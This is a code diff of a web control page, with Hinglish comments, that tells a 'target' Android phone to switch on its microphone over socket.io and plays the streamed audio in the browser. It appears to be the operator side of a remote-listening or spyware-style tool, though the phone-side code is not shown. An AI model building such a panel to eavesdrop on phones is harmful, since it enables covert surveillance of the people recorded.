@@ -13,7 +13,6 @@
         .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
         .back-btn { color: white; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
         
-        /* Device Name Display (No Input Box) */
         .device-info { margin-top: 20px; color: #aaa; font-size: 14px; letter-spacing: 1px; }
         .device-info span { color: var(--accent); font-weight: bold; font-size: 18px; }
 
@@ -48,7 +47,7 @@
         }
         .btn:hover { background: #333; transform: scale(1.05); }
         .btn.active { background: var(--accent); color: black; border-color: var(--accent); box-shadow: 0 0 15px rgba(0,255,136,0.4); }
-        .btn.stop:hover { background: #ff4444; border-color: #ff4444; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         
         #statusText { font-family: 'Courier New', monospace; letter-spacing: 1px; }
 
@@ -61,7 +60,7 @@
     </div>
 
     <div class="device-info">
-        TARGET DEVICE: <span id="targetDisplay">LOADING...</span>
+        TARGET: <span id="targetDisplay">SEARCHING...</span>
     </div>
 
     <div class="mic-container">
@@ -74,7 +73,7 @@
             <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
             <div class="bar"></div><div class="bar"></div>
         </div>
-        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">READY TO CONNECT</p>
+        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">WAITING FOR START...</p>
     </div>
 
     <div class="controls">
@@ -96,24 +95,33 @@
         let isStreaming = false;
         let currentDeviceId = null;
 
-        // 🔥 Page Load hote hi LocalStorage check karega
+        // 🔥 1. ID PATA KARNE KA LOGIC (URL se ya Storage se)
         window.onload = function() {
-            // 'active_device_id' key check kar raha hu (Parent app me yahi naam hona chahiye)
-            currentDeviceId = localStorage.getItem("active_device_id");
+            // Step A: URL check karo (?deviceId=xxxx)
+            const urlParams = new URLSearchParams(window.location.search);
+            currentDeviceId = urlParams.get('deviceId');
 
+            // Step B: Agar URL me nahi hai, to LocalStorage check karo (Fallback)
             if (!currentDeviceId) {
-                document.getElementById('targetDisplay').innerText = "NO DEVICE SELECTED";
-                alert("⚠️ Error: No Device Selected! Please go back and select a device.");
+                currentDeviceId = localStorage.getItem("active_device_id");
+            }
+
+            // UI Update
+            if (!currentDeviceId) {
+                document.getElementById('targetDisplay').innerText = "❌ NO ID FOUND";
+                document.getElementById('statusText').innerText = "Error: Invalid Link";
                 document.getElementById('startBtn').disabled = true;
+                alert("Device ID nahi mili! Link check karein.");
             } else {
                 document.getElementById('targetDisplay').innerText = currentDeviceId;
+                document.getElementById('statusText').innerText = "READY: " + currentDeviceId;
             }
         };
 
         function connectAndListen() {
             if (!currentDeviceId) return;
 
-            // Audio Context Setup
+            // Audio Context Rule: User interaction required
             if (!audioContext) {
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
             }
@@ -130,10 +138,10 @@
             socket.on("connect", () => {
                 console.log("Connected to Server");
                 
-                // 🔥 Auto Join using LocalStorage ID
+                // 🔥 Join Room with Specific ID
                 socket.emit("join", currentDeviceId);
                 
-                // Phone ko command bhejo ki Mic chalu kare
+                // 🔥 Send Command to Android to start Mic
                 socket.emit("control-event", {
                     room: currentDeviceId,
                     action: "start-mic"
@@ -156,41 +164,30 @@
             });
         }
 
+        // --- AUDIO PLAYER (PCM) ---
         function playPcmChunk(arrayBuffer) {
             if (!audioContext) return;
-
             const int16Array = new Int16Array(arrayBuffer);
             const float32Array = new Float32Array(int16Array.length);
-
             for (let i = 0; i < int16Array.length; i++) {
                 float32Array[i] = int16Array[i] / 32768; 
             }
-
             const audioBuffer = audioContext.createBuffer(1, float32Array.length, 44100);
             audioBuffer.getChannelData(0).set(float32Array);
-
             const source = audioContext.createBufferSource();
             source.buffer = audioBuffer;
             source.connect(audioContext.destination);
-
-            if (nextTime < audioContext.currentTime) {
-                nextTime = audioContext.currentTime;
-            }
+            if (nextTime < audioContext.currentTime) nextTime = audioContext.currentTime;
             source.start(nextTime);
             nextTime += source.buffer.duration;
-            
             animateBars();
         }
 
         function stopListen() {
             isStreaming = false;
             if (socket) {
-                // Phone ko command bhejo ki Mic band kare
                 if(currentDeviceId) {
-                    socket.emit("control-event", {
-                        room: currentDeviceId,
-                        action: "stop-mic"
-                    });
+                    socket.emit("control-event", { room: currentDeviceId, action: "stop-mic" });
                 }
                 socket.disconnect();
                 socket = null;
